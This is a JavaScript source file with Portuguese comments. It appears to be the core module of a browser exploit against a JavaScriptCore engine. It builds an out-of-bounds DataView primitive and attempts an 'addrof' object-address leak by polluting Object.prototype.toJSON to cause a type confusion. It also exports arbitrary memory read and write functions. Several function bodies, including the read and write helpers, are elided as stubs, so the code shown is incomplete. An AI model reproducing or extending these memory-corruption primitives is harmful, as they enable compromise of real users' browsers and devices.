// js/core_exploit.mjs (v31.R17 - Foco em estabilizar OOB em Addrof, identificação na sonda)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; 

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; 

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { 
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment_R17';
    const wasSetup = isOOBEnvironmentSetup;
    if (!wasSetup && !options.force_clear_even_if_not_setup) return;
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
    log(`[${FNAME_CLEAR}] Ambiente limpo. Setup anterior: ${wasSetup}. Novo: ${isOOBEnvironmentSetup}`, 'info');
}
export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }

export async function triggerOOB_primitive(options = { force_reinit: false, caller_fname: "Unknown" }) { 
    const FNAME_TRIGGER = `CoreExploit.triggerOOB_primitive(caller:${options.caller_fname})_R17`;
    let currentLength = 0;
    // Verifica estado atual apenas se não for forçar reinit e já estiver setup
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            try { currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true); } catch(e){ currentLength = 0; }
        }
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real && currentLength === 0xFFFFFFFF) {
            log(`[${FNAME_TRIGGER}] Ambiente OOB já OK e expandido.`, 'info'); return true;
        } else { 
            log(`[${FNAME_TRIGGER}] OOB Env inconsistente (len:${toHex(currentLength)}). Forçando re-init.`, 'warn'); 
            clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
        }
    } else if (options.force_reinit) {
        log(`[${FNAME_TRIGGER}] Forçando re-inicialização OOB...`, 'info');
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }

    log(`[${FNAME_TRIGGER}] Iniciando Config (Force: ${options.force_reinit}, Anterior Setup: ${isOOBEnvironmentSetup})`, 'test');
    const currentAllocSize = getOOBAllocationSize(); 
    // clearOOBEnvironment já foi chamado se force_reinit ou se inconsistente
    if (!options.force_reinit && isOOBEnvironmentSetup) { /* não deveria chegar aqui se já está OK */ }
    else if (!isOOBEnvironmentSetup) { /* já limpo ou forçado a limpar */ }


    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize); 
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        isOOBEnvironmentSetup = true; 
        log(`[${FNAME_TRIGGER}] AB e DV criados. isOOBEnvSetup: ${isOOBEnvironmentSetup}`, 'info');

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, 0xFFFFFFFF, true);
            log(`    m_length do oob_dv (em ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}) expandido para 0xFFFFFFFF.`, 'info', FNAME_TRIGGER);
        } else { 
            const eMsg = `Falha ao expandir m_length: AllocSize (${currentAllocSize}) pequeno para offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}.`; 
            log(eMsg, 'critical', FNAME_TRIGGER); 
            isOOBEnvironmentSetup = false; throw new Error(eMsg); 
        }
        const finalLen = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true);
        log(`[${FNAME_TRIGGER}] Ambiente OOB CONFIGURADO. oob_dv.len=${toHex(finalLen)}. isOOBEnvSetup: ${isOOBEnvironmentSetup}`, 'good');
        return true;
    } catch (e) { 
        log(`ERRO CRÍTICO ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER); 
        console.error(e); clearOOBEnvironment({ force_clear_even_if_not_setup: true }); throw e; 
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (sem alterações) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (sem alterações) ... */ }

export function isOOBReady(caller_fname = "Unknown") { /* ... (sem alterações da R16, com logging detalhado) ... */ }
async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... (sem alterações) ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... (sem alterações) ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... (sem alterações) ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... (sem alterações) ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... (sem alterações) ... */ }

// Variáveis para attemptAddrofUsingCoreHeisenbug (R17)
let _targetObjectForCoreAddrof_R17 = null; 
let _core_heisenbug_tc_on_first_expected_object_confirmed_R17 = false;
let _core_victim_float_view_for_addrof_R17 = null; 
// Esta flag global de módulo é setada por attemptAddrof... e lida pela sonda.
let _probeR17_is_expecting_core_m2_victim = false;
let _probeR17_core_m2_victim_ref_for_check = null; // Armazena a referência do M2 para a sonda comparar

function _toJSONProbeForCoreAddrof_R17() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R17";
    let currentThisType = Object.prototype.toString.call(this);
    let isOurExpectedM2Target = false;

    if (_probeR17_is_expecting_core_m2_victim && this === _probeR17_core_m2_victim_ref_for_check) {
        isOurExpectedM2Target = true;
    }

    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Is ref _probeR17_core_m2_victim_ref_for_check? ${isOurExpectedM2Target}. TC Confirmed Flag (before): ${_core_heisenbug_tc_on_first_expected_object_confirmed_R17}`, "leak");

    if (isOurExpectedM2Target && currentThisType === '[object Object]' && !_core_heisenbug_tc_on_first_expected_object_confirmed_R17) { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para _probeR17_core_m2_victim_ref_for_check! Escrevendo targetObject...`, "vuln");
        _core_heisenbug_tc_on_first_expected_object_confirmed_R17 = true; 
        _probeR17_is_expecting_core_m2_victim = false; // Consumiu a expectativa

        if (_targetObjectForCoreAddrof_R17 && _core_victim_float_view_for_addrof_R17) {
            try {
                // Não há this.writer_view_ref_probe, usamos a variável de módulo _core_victim_float_view_for_addrof_R17
                _core_victim_float_view_for_addrof_R17[0] = _targetObjectForCoreAddrof_R17;
                log(`[${FNAME_PROBE}] targetObject escrito em _core_victim_float_view_for_addrof_R17[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
                _core_heisenbug_tc_on_first_expected_object_confirmed_R17 = false; 
            }
        } else { 
            log(`[${FNAME_PROBE}] AVISO: targetObject ou float_view não definidos para escrita na sonda.`, "warn");
            _core_heisenbug_tc_on_first_expected_object_confirmed_R17 = false; 
        }
    } else if (isOurExpectedM2Target && currentThisType !== '[object Object]' && !_core_heisenbug_tc_on_first_expected_object_confirmed_R17) {
        log(`[${FNAME_PROBE}] 'this' é _probeR17_core_m2_victim_ref_for_check, mas tipo é ${currentThisType}. TC falhou.`, "warn");
         _probeR17_is_expecting_core_m2_victim = false; // Provavelmente não vai mais encontrar
    } else if (_probeR17_is_expecting_core_m2_victim && currentThisType === '[object Object]' && !isOurExpectedM2Target) {
        log(`[${FNAME_PROBE}] 'this' é [object Object] mas não é a referência _probeR17_core_m2_victim_ref_for_check esperada. Ainda esperando M2.`, "warn");
    }
    return { core_addrof_probe_r17_executed: true };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R17
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R17";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R17...`, "info");

    _targetObjectForCoreAddrof_R17 = targetObject; 
    _core_heisenbug_tc_on_first_expected_object_confirmed_R17 = false; 
    _core_victim_float_view_for_addrof_R17 = null;
    _probeR17_is_expecting_core_m2_victim = false; 
    _probeR17_core_m2_victim_ref_for_check = null;

    let addrof_result = { success: false, message: "Addrof (Heisenbug R17) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R17 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R17 = false;

    try {
        log(`[${FNAME_FUNC}] Chamando triggerOOB_primitive...`, "info");
        await triggerOOB_primitive({ force_reinit: true, caller_fname: FNAME_FUNC }); 
        log(`[${FNAME_FUNC}] triggerOOB_primitive completado. Checando isOOBReady...`, "info");
        if (!isOOBReady(FNAME_FUNC)) { 
            addrof_result.message = "Falha na inicialização OOB em attemptAddrofUsingCoreHeisenbug_R17 (isOOBReady falhou).";
            log(`[${FNAME_FUNC}] ${addrof_result.message}`, "error");
            throw new Error(addrof_result.message); 
        }
        log(`[${FNAME_FUNC}] Ambiente OOB pronto. Escrevendo valor crítico...`, "info");

        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        log(`[${FNAME_FUNC}] Escrita crítica em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)} realizada.`, "warn");
        await PAUSE(150); 

        let core_victim_buffer_local = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R17 = new Float64Array(core_victim_buffer_local); 
        _core_victim_float_view_for_addrof_R17.fill(0.778899112233); 
        
        _probeR17_core_m2_victim_ref_for_check = { m2_marker_field_r17: "core_m2_r17_unique_id" }; // Objeto que a sonda vai procurar
        
        let core_m1_victim = { 
            id_m1: "core_m1_container_R17", 
            payload_m2: _probeR17_core_m2_victim_ref_for_check // Passa a referência
        };
        log(`[${FNAME_FUNC}] Estrutura M1/M2 criada para addrof.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R17, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R17 = true;
        
        _probeR17_is_expecting_core_m2_victim = true; // Ativa a expectativa para a sonda
        JSON.stringify(core_m1_victim); 
        _probeR17_is_expecting_core_m2_victim = false; 
        log(`[${FNAME_FUNC}] JSON.stringify concluído. TC Confirmada (Flag): ${_core_heisenbug_tc_on_first_expected_object_confirmed_R17}`, "info");
        
        if (_core_heisenbug_tc_on_first_expected_object_confirmed_R17) {
            const val_double = _core_victim_float_view_for_addrof_R17[0]; 
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA confirmada e escrita realizada! Lido: Dbl=${val_double}, I64=${leaked_addr64.toString(true)}`, "vuln");

            if (val_double !== 0.778899112233 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high(); const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) { addrof_result.success = true; addrof_result.message = `Addrof R17 TC OK. Addr Pot: ${leaked_addr64.toString(true)}`; }
                else { addrof_result.message = `Addrof R17 TC OK, mas val ${leaked_addr64.toString(true)} é NaN/Inf.`;}
            } else { addrof_result.message = `Addrof R17 TC OK, mas val (${leaked_addr64.toString(true)}) é preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda R17 para o objeto esperado."; }
    } catch (e) { 
        log(`[${FNAME_FUNC}] EXCEPTION CATCH: ${e.message || String(e)}`, "critical");
        addrof_result.message = `Erro crítico em Addrof R17: ${e.message || String(e)}`; 
    } 
    finally {
        if (pollutedByCore_R17) { if (originalToJSON_R17) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R17); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R17 = null; _core_victim_float_view_for_addrof_R17 = null; 
        _probeR17_is_expecting_core_m2_victim = false; _probeR17_core_m2_victim_ref_for_check = null;
    }
    log(`[${FNAME_FUNC}] Retornando resultado Addrof R17: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

export async function getStableConfusedArrayBuffer() { /* ... (sem alterações da R16) ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... (sem alterações da R16) ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... (sem alterações da R16) ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... (sem alterações da R16) ... */ }
